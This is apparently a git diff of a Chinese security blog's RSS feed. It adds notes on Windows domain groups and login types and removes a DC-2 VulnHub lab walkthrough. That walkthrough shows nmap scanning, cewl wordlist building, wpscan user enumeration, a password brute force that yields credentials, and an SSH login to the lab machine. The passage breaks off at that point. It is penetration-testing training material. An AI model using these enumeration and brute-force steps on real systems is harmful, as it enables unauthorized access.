+&lt;/h6&gt;&lt;p&gt;Domain users（域成员组），在默认的情况下所有加入域内的主机都是在这个组内， 在域内的users组
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230901222.png&#34;
+	width=&#34;1008&#34;
+	height=&#34;314&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230901222_hu12096593033465144686.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230901222_hu10839155905051079656.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230901222&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;321&#34;
+		data-flex-basis=&#34;770px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h6 id=&#34;domain-computers组&#34;&gt;Domain Computers组
+&lt;/h6&gt;&lt;p&gt;任何由域管理员建立的账号都属于这个组
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230907671.png&#34;
+	width=&#34;1013&#34;
+	height=&#34;543&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230907671_hu254723960610241691.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230907671_hu4378477109586489243.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230907671&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;186&#34;
+		data-flex-basis=&#34;447px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h5 id=&#34;域机器介绍&#34;&gt;域机器介绍
+&lt;/h5&gt;&lt;p&gt;机器在加入到域之后可以使用域用户登录，也可以使用本机用户登录。
+区别：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;本地用户登录，是存放在本地文件中，然后本地进行校验。而域内用户，是要通过DC的认证之后才能登录，用户信息存放唉域控上&lt;/li&gt;
+&lt;li&gt;本地用户登录主要是对比NTLM HASH值，域认证是通过Kerberos认证。&lt;/li&gt;
+&lt;li&gt;机器可以选择本地登录或域用户登录，本地用户 机器名\用户名  域 内用户 域名\用户名。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h6 id=&#34;域内最高管理员权限&#34;&gt;域内最高管理员权限
+&lt;/h6&gt;&lt;p&gt;域内最高管理员权限是域控机器上的administrator，它是没有UAC认证的，它也是每个域内机器的本地管理员和机器名administrator具有相同的权限，SID也是500
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230916727.png&#34;
+	width=&#34;1005&#34;
+	height=&#34;265&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230916727_hu17059738960362032867.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230916727_hu6651280779645704578.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230916727&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;379&#34;
+		data-flex-basis=&#34;910px&#34;
+	
+&gt;
+登录方式：
+域名\用户名
+密码为域用户的密码
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230931434.png&#34;
+	width=&#34;788&#34;
+	height=&#34;652&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230931434_hu9252022422438854228.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104230931434_hu3843246680887864647.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104230931434&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;120&#34;
+		data-flex-basis=&#34;290px&#34;
+	
+&gt;
+本地用户登录方式
+主机名\用户名
+密码为用户对应密码
+&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104231102478.png&#34;
+	width=&#34;1302&#34;
+	height=&#34;951&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104231102478_hu6529459968351220186.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.assets/image-20241104231102478_hu14392737193187588870.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20241104231102478&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;136&#34;
+		data-flex-basis=&#34;328px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>归档</title>
         <link>https://dxlaboratory.github.io/archives/</link>
         <pubDate>Tue, 28 May 2019 00:00:00 +0000</pubDate>
         
         <guid>https://dxlaboratory.github.io/archives/</guid>
         <description></description>
-        </item>
-        <item>
-        <title></title>
-        <link>https://dxlaboratory.github.io/p/</link>
-        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-        
-        <guid>https://dxlaboratory.github.io/p/</guid>
-        <description>&lt;p&gt;title: dc-2
-description: 这是一个副标题
-date: 2020-09-09
-slug: test-chinese
-categories:
-- 靶机&lt;/p&gt;
-&lt;hr&gt;
-&lt;h1 id=&#34;前言&#34;&gt;前言
-&lt;/h1&gt;&lt;hr&gt;
-&lt;blockquote&gt;
-&lt;p&gt;与 DC-1 非常相似，DC-2 是另一个专门建造的易受攻击实验室，目的是获得渗透测试领域的经验。
-与最初的 DC-1 一样，它的设计考虑到了初学者。
-必须具备 Linux 技能和熟悉 Linux 命令行，以及具备一些基本渗透测试工具的经验。
-就像 DC-1 一样，有五个标志，包括最后一个标志。
-再说一次，就像 DC-1 一样，这些标志对初学者很重要，但对有经验的人来说并不那么重要。
-简而言之，唯一真正重要的标志是最后一面旗帜。
-对于初学者来说，Google 是您的朋友。嗯，除了所有的隐私问题等。
-我还没有探索实现 root 的所有方法，因为我放弃了我一直在努力的上一个版本，除了基本操作系统安装之外，我完全从头开始。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;[TOC]&lt;/p&gt;
-&lt;h1 id=&#34;实验环境&#34;&gt;实验环境：
-&lt;/h1&gt;&lt;h2 id=&#34;下载链接&#34;&gt;下载链接：
-&lt;/h2&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.vulnhub.com/entry/dc-1,292/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://www.vulnhub.com/entry/dc-1,292/&lt;/a&gt;&lt;br&gt;
-（下载慢，放到迅雷里面）&lt;/p&gt;
-&lt;h2 id=&#34;vmware环境配置&#34;&gt;VMware环境配置
-&lt;/h2&gt;&lt;p&gt;必须是NAT模式，且攻击机也是NAT模式&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/index.zh-cn.assets/20241104083955.jpg&#34;
-	width=&#34;2559&#34;
-	height=&#34;1440&#34;
-	srcset=&#34;https://dxlaboratory.github.io/p/index.zh-cn.assets/20241104083955_hu5067043827768277685.jpg 480w, https://dxlaboratory.github.io/p/index.zh-cn.assets/20241104083955_hu5508564395504318771.jpg 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;20241104083955&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;177&#34;
-		data-flex-basis=&#34;426px&#34;
-	
-&gt;![20241104083955](20241104083955.jpg&lt;/p&gt;
-&lt;h1 id=&#34;攻击步骤&#34;&gt;攻击步骤
-&lt;/h1&gt;&lt;h2 id=&#34;一信息收集&#34;&gt;一、信息收集
-&lt;/h2&gt;&lt;p&gt;查看自己的IP地址，使用nmap进行同网段扫描&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ifconfig
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ip:192.168.26.128
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -sP 192.168.26.128/24
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;目标IP：192.168.26.129&lt;/p&gt;
-&lt;p&gt;扫描该IP端口及服务&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -p- -sV 192.168.26.129
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;结果&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 23:26 EDT
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap scan report for 192.168.26.129
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host is up (0.00062s latency).
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Not shown: 65533 closed tcp ports (reset)
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT     STATE SERVICE VERSION
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MAC Address: 00:0C:29:F4:BE:15 (VMware)
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap done: 1 IP address (1 host up) scanned in 7.27 seconds
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;一个http的80端口，一个7744的ssh服务&lt;/p&gt;
-&lt;p&gt;如果访问打不开网站的话，说明网站被重定向了&lt;/p&gt;
-&lt;p&gt;添加一下主机就行了&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vim /etc/hosts
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;192.168.26.129 dc-2
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;flag1&#34;&gt;flag1
-&lt;/h2&gt;&lt;p&gt;打开页面发现flag标志&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cdn.nlark.com/yuque/0/2024/png/43232378/1730092430136-e3c4d268-b813-45cb-8f8e-f59565614be0.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;意思：&lt;/p&gt;
-&lt;p&gt;让我们找会员的登录密码，登录一个人后给下一个flag&lt;/p&gt;
-&lt;h2 id=&#34;二渗透阶段&#34;&gt;二、渗透阶段
-&lt;/h2&gt;&lt;h2 id=&#34;flag2&#34;&gt;flag2
-&lt;/h2&gt;&lt;p&gt;cewl介绍:&lt;/p&gt;
-&lt;p&gt;是一个用于生成自定义字典文件的工具，通常用于渗透测试和密码破解。它通过爬取目标网站，提取其中的单词、短语和其他文本信息，以便生成一个用于攻击的字典文件。&lt;/p&gt;
-&lt;p&gt;扒一下网站，看看有什么&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cewl http://dc-2 -w passwd.txt
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.nlark.com/yuque/0/2024/png/43232378/1730093071241-071746f0-0615-4335-9876-010c963639e3.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;再扫描一下目录&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dirb http://dc-2 
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.nlark.com/yuque/0/2024/png/43232378/1730093601145-d19f15c5-fdc2-401e-87dd-9079e2f6cdde.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;扫描到登录界面&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cdn.nlark.com/yuque/0/2024/png/43232378/1730093661658-c232badc-2e2a-4823-9a46-691f1b1855e5.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;有密码了，现在只要枚举一下用户名&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wpscan --url http://dc-2/ -e u      //枚举用户名字
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;枚举出来的用户名&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;admin
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tom
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;jerry
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;然后创建一个user.txt文件&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;touch user.txt
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;echo &amp;#34;admin&amp;#34; &amp;gt;&amp;gt; user.txt
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;echo &amp;#34;tom&amp;#34; &amp;gt;&amp;gt; user.txt
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;echo &amp;#34;jerry&amp;#34; &amp;gt;&amp;gt; user.txt
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;爆破登录框&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wpscan --url http://dc-2/ -U user.txt -P passwd.txt
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;拿到用户和密码进行登录&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[!] Valid Combinations Found:                                                                                                           
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Username: jerry, Password: adipiscing
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Username: tom, Password: parturient
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;到处点一点拿到flag2&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cdn.nlark.com/yuque/0/2024/png/43232378/1730094635282-25fd07ef-c4d2-4f92-aca5-ad8b7e156fa4.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;意思：&lt;/p&gt;
-&lt;p&gt;如果你不能利用WordPress并走捷径，还有另一种方法。&lt;/p&gt;
-&lt;p&gt;希望你找到了另一个切入点。&lt;/p&gt;
-&lt;h2 id=&#34;flag3&#34;&gt;flag3
-&lt;/h2&gt;&lt;p&gt;前面有一个7744端口的ssh远程连接服务&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh tom@192.168.26.129 -p 7744 
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;进行连接登录&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cdn.nlark.com/yuque/0/2024/png/43232378/1730097632723-ab47096f-b49b-493e-9723-8c80094145c6.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;ls-l查看文件目录，有一个flag3.txt&lt;/p&gt;
-&lt;p&gt;cat 查看该文件发现权限不足&lt;/p&gt;
-&lt;p&gt;查看可用的命令&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;compgen -c       //查看可以使用的指令
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
